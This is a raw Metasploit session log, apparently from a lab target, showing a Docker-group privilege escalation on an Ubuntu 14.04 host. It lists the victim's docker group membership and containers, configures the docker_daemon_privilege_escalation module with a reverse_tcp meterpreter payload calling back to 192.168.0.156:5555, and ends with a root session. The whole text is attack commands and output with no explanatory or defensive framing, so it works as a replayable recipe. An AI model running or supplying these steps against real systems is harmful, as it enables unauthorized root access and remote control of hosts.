meterpreter > shell
Process 2889 created.
Channel 1 created.
id
uid=1121(boba_fett) gid=100(users) groups=100(users),999(docker)
groups
users docker
docker ps
CONTAINER ID        IMAGE                  COMMAND             CREATED             STATUS              PORTS               NAMES
65967e577dde        7_of_diamonds:latest   "/bin/bash"         4 years ago         Up 6 hours                              7_of_diamonds
docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
7_of_diamonds       latest              889e19a44bad        4 years ago         73.6MB
ubuntu              latest              d70eaf7277ea        4 years ago         72.9MB





msf6 exploit(linux/local/docker_daemon_privilege_escalation) > show options

Module options (exploit/linux/local/docker_daemon_privilege_escalation):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  2                yes       The session to run this module on


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.0.156    yes       The listen address (an interface may be specified)
   LPORT  5555             yes       The listen port



sf6 exploit(linux/local/docker_daemon_privilege_escalation) > run
[*] Started reverse TCP handler on 192.168.0.156:5555 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] Docker daemon is accessible.
[+] The target is vulnerable.
[*] Writing payload executable to '/tmp/vfmAjYnRWU'
[*] Executing script to create and run docker container
[*] Sending stage (3045380 bytes) to 192.168.0.207
[+] Deleted /tmp/vfmAjYnRWU
[*] Meterpreter session 3 opened (192.168.0.156:5555 -> 192.168.0.207:59030) at 2025-03-07 12:48:27 -0500
[*] Waiting 60s for payload

meterpreter > sysinfo
Computer     : 192.168.0.207
OS           : Ubuntu 14.04 (Linux 3.13.0-24-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > getuid
Server username: root
meterpreter > shell
Process 3518 created.
Channel 1 created.
id
uid=1121(boba_fett) gid=100(users) euid=0(root) groups=0(root),100(users),999(docker)
groups
users docker
